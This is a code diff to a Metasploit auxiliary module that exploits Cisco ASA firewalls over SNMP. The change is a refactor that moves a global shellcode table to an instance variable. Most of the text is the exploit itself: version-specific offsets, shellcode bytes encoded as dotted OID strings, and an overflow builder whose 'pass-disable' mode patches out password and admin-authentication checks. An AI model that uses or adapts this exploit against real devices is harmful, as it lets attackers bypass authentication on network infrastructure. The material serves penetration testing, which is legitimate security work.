@@ -37,7 +37,7 @@ class MetasploitModule < Msf::Auxiliary
     ], self.class)
     deregister_options("VERSION")
 
-    $shellcode = {
+    @shellcode = {
 
       "9.2(3)" => ["29.112.29.8",   # jmp_esp_offset, 0
                    "134.115.39.9",  # saferet_offset, 1
@@ -47,8 +47,7 @@ class MetasploitModule < Msf::Auxiliary
                    "85.49.192.137", # pmcheck_code,   5
                    "0.80.8.8",      # admauth_bounds, 6
                    "64.90.8.8",     # admauth_offset, 7
-                   "85.137.229.87", # admauth_code,   8
-                   "49.192.64.195"] # patched_code,   9
+                   "85.137.229.87"] # admauth_code,   8
     }
   end
 
@@ -78,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
 
     asa_vers = fw_version_check(vers_string)
 
-    if $shellcode[asa_vers]
+    if @shellcode[asa_vers]
       print_status("Payload for Cisco ASA version #{asa_vers} available")
       return Exploit::CheckCode::Appears
     end
@@ -89,30 +88,30 @@ class MetasploitModule < Msf::Auxiliary
 
   def build_shellcode(asa_vers, mode)
       if mode == 'pass-disable'
-          pmcheck_bytes = $shellcode[asa_vers][9]
-          admauth_bytes = $shellcode[asa_vers][9]
+          pmcheck_bytes = "49.192.64.195" # return true code
+          admauth_bytes = "49.192.64.195"
       else
-          pmcheck_bytes = $shellcode[asa_vers][5]
-          admauth_bytes = $shellcode[asa_vers][8]
+          pmcheck_bytes = @shellcode[asa_vers][5]
+          admauth_bytes = @shellcode[asa_vers][8]
       end
 
       preamble_snmp = ""
       preamble_snmp += "49.219.49.246.49.201.49.192.96.49.210.128.197.16.128.194.7.4.125.80.187."
-      preamble_snmp += $shellcode[asa_vers][3]
+      preamble_snmp += @shellcode[asa_vers][3]
       preamble_snmp += ".205.128.88.187."
-      preamble_snmp += $shellcode[asa_vers][6]
+      preamble_snmp += @shellcode[asa_vers][6]
       preamble_snmp += ".205.128.199.5."
-      preamble_snmp += $shellcode[asa_vers][4]
+      preamble_snmp += @shellcode[asa_vers][4]
       preamble_snmp += "."
       preamble_snmp += pmcheck_bytes
       preamble_snmp += ".199.5."
-      preamble_snmp += $shellcode[asa_vers][7]
+      preamble_snmp += @shellcode[asa_vers][7]
       preamble_snmp += "."
       preamble_snmp += admauth_bytes
       preamble_snmp += ".97.104."
-      preamble_snmp += $shellcode[asa_vers][1]
+      preamble_snmp += @shellcode[asa_vers][1]
       preamble_snmp += ".128.195.16.191.11.15.15.15.137.229.131.197."
-      preamble_snmp += $shellcode[asa_vers][2]
+      preamble_snmp += @shellcode[asa_vers][2]
       preamble_snmp += ".195"
 
       wrapper = preamble_snmp
@@ -126,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
       head += "9.95"
       finder_snmp = "139.124.36.20.139.7.255.224.144"
 
-      overflow = [head, wrapper, $shellcode[asa_vers][0], finder_snmp].join(".")
+      overflow = [head, wrapper, @shellcode[asa_vers][0], finder_snmp].join(".")
       return overflow
   end
 
